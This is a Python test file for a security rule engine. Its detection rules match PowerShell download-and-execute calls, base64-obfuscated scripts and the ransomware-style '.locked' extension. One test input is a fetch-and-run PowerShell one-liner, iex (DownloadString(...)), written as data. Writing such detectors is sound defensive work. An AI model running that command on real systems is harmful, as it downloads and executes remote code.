"""规则引擎测试：外置规则库匹配 / 置信度 / 判定策略"""
import json

import pytest

from zhuzhu_Copilot.core.security_engine.rules import RuleEngine


@pytest.fixture()
def engine(tmp_path):
    rules = {
        "action_policy": {"high": 80, "mid": 40, "low": 0},
        "rules": [
            {"id": "t.liveload", "category": "script", "confidence": 90,
             "matchers": [{"type": "pattern", "params": {"field": "script",
               "patterns": ["(?i)(iex\\s*\\(|downloadstring)"]}}]},
            {"id": "t.obf", "category": "script", "confidence": 55,
             "matchers": [{"type": "ratio", "params": {"field": "script",
               "charset": "base64", "min_ratio": 0.7}},
               {"type": "length", "params": {"field": "script", "min": 120}}]},
            {"id": "t.ext", "category": "file", "confidence": 80,
             "matchers": [{"type": "extension", "params": {"values": [".locked"]}}]},
        ],
    }
    p = tmp_path / "rules.json"
    p.write_text(json.dumps(rules), encoding="utf-8")
    return RuleEngine(p)


def test_match_script(engine):
    hits = engine.match({"script": "iex (DownloadString('http://x/y'))"}, "script")
    assert [r["id"] for r, _ in hits] == ["t.liveload"]


def test_confidence_strategy(engine):
    assert engine.confidence({"script": "evil"}, "script") == 0
    assert engine.confidence({"script": "iex("}, "script") == 90


def test_category_filter(engine):
    # category=file 时脚本规则不参与
    hits = engine.match({"script": "iex("}, "file")
    assert hits == []
    hits = engine.match({"script": "iex("}, None)
    assert hits != []


def test_extension_matcher(engine):
    assert engine.match({"ext": ".locked", "name": "a.locked"}, "file") != []
    assert engine.match({"ext": ".txt", "name": "a.txt"}, "file") == []


def test_add_rule_and_matcher(engine):
    engine.add_matcher("always-true", lambda s, p: True)
    engine.add_rule({"id": "t.custom", "category": "file", "confidence": 10,
                     "matchers": [{"type": "always-true", "params": {}}]})
    hits = engine.match({"ext": ".txt"}, "file")
    assert any(r["id"] == "t.custom" for r, _ in hits)


def test_disabled_rule_skipped(engine):
    engine.add_rule({"id": "t.off", "category": "file", "enabled": False,
                     "confidence": 99, "matchers": [{"type": "extension",
                     "params": {"values": [".locked"]}}]})
    assert not any(r["id"] == "t.off" for r, _ in engine.match({"ext": ".locked"}, "file"))